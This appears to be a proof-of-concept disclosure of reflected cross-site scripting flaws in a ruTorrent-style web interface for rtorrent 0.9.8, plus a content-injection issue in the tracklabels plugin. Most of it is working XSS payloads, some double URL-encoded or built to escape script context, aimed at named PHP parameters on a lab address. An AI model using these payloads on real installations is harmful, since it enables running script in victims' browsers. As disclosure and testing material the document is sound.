https://github.com/rakshasa/rtorrent


Version: 0.9.8


rtorrent

POST
filename:

```https://172.17.0.30/php/addtorrent.php?dir_edit=%2Fdownloads%2Fincoming%2F```

```<script>alert(1)</script>```


Some of the payloads required to be double URL encoded.  An example below:

URL Decoded name[]:

```https://172.17.0.30/php/addtorrent.php?result[]=Success&name[]=ubuntu-24.04-desktop-amd64.iso.torrent<script>alert(1)</script>```

Double URL Encoded name[]:

```https://172.17.0.30/php/addtorrent.php?result[]=Success&name[]=ubuntu-24.04-desktop-amd64.iso.torrent%25%33%63%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34%25%32%38%25%33%31%25%32%39%25%33%63%25%32%66%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65```


result[]:

```https://172.17.0.30/php/addtorrent.php?result[]=Success%3cscript%3ealert(1)%3c%2fscript%3e&name[]=ubuntu-24.04-desktop-amd64.iso.torrent&```

Double URL Encoded url:

```https://172.17.0.30/php/addtorrent.php?dir_edit=%2Fdownloads%2Fincoming%2F&url=%25%36%38%25%37%34%25%37%34%25%37%30%25%37%33%25%33%61%25%32%66%25%32%66%25%36%32%25%36%63%25%36%31%25%36%38%25%32%65%25%36%33%25%36%66%25%36%64%25%32%66%25%36%32%25%36%63%25%36%31%25%36%38%25%32%65%25%37%34%25%36%66%25%37%32%25%37%32%25%36%35%25%36%65%25%37%34%25%36%39%25%33%36%25%33%32%25%33%30%25%37%61%25%33%63%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34%25%32%38%25%33%31%25%32%39%25%33%63%25%32%66%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65```


Bit more complex than the others, had to close tags out and open new ones

```';}}</script><script>alert(1)</script>//```

frame:
```https://172.17.0.30/plugins/_getdir/getdirs.php?dir=&btn=dir_btn&edit=dir_edit&frame=dir_edit_frame'%3b%7d%7d%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%3ealert(1)%3c%2f%73%63%72%69%70%74%3e%2f%2f&time=1719776075718```

edit:
```https://172.17.0.30/plugins/_getdir/getdirs.php?dir=&btn=dir_btn&edit=dir_edit'%3b%7d%7d%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%3ealert(1)%3c%2f%73%63%72%69%70%74%3e%2f%2f&frame=dir_edit_frame&time=1719776075718```

btn:
```https://172.17.0.30/plugins/_getdir/getdirs.php?dir=&btn=dir_btn'%3b%7d%7d%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%3ealert(1)%3c%2f%73%63%72%69%70%74%3e%2f%2f&edit=dir_edit&frame=dir_edit_frame&time=1719776075718```


Content Injection:
There is also a content where a domain hosting content at the root will be loaded into the page

```https://172.17.0.30/plugins/tracklabels/action.php?tracker=<DOMAIN>```
